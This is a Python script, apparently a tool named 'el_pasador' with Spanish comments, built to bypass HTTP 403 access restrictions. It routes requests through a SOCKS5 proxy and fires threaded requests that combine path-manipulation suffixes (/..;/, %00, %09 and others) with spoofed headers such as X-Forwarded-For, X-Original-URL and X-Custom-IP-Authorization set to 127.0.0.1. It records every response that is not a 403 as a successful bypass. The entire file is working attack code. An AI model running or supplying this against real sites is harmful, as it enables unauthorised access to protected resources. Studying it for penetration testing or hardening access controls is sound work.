
import requests
import threading
import socks
import socket
import json
import time

# Configurar proxy SOCKS
def set_socks_proxy(proxy):
    if proxy:
        socks_host, socks_port = proxy.split(':')
        socks.set_default_proxy(socks.SOCKS5, socks_host, int(socks_port))
        socket.socket = socks.socksocket

# Verificar URL con métodos adicionales
def check_url(url, headers=None, proxy=None):
    if headers is None:
        headers = {}
    if proxy:
        set_socks_proxy(proxy)
    response = requests.get(url, headers=headers)
    return response.status_code, response.elapsed.total_seconds()

# Prueba de bypass con varias permutaciones
def bypass_test(url, method, headers, proxy):
    try:
        status_code, response_time = check_url(method, headers, proxy)
        result = f"Trying {method} with headers {headers} - Status Code: {status_code}, Response Time: {response_time}s\n"
        print(result)
        if status_code != 403:
            result += f"Bypass successful with {method} and headers {headers}\n"
    except Exception as e:
        result = f"Error with {method} and headers {headers}: {e}\n"
    
    with open("el_pasador_results.txt", "a") as file:
        file.write(result)

def main():
    # Cargar configuración desde archivo
    with open("config.json", "r") as config_file:
        config = json.load(config_file)
    
    url = config["url"]
    proxy = config.get("proxy", "")

    # Métodos comunes de bypass
    bypass_methods = [
        url,
        url + "/.",
        url + "/..;/",
        url + "/%20",
        url + "?",
        url + "%09",
        url + "%00",
        url.replace('403', '404')
    ]

    # Lista de headers y métodos HTTP para probar
    headers_list = [
        {},  # No headers
        {"User-Agent": "Mozilla/5.0"},
        {"Referer": "https://www.google.com"},
        {"X-Original-URL": url},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
    ]

    threads = []
    for method in bypass_methods:
        for headers in headers_list:
            thread = threading.Thread(target=bypass_test, args=(url, method, headers, proxy))
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Pequeño retraso para evitar sobrecarga

    for thread in threads:
        thread.join()

    print("Bypass attempts completed. Check 'el_pasador_results.txt' for details.")

if __name__ == "__main__":
    main()
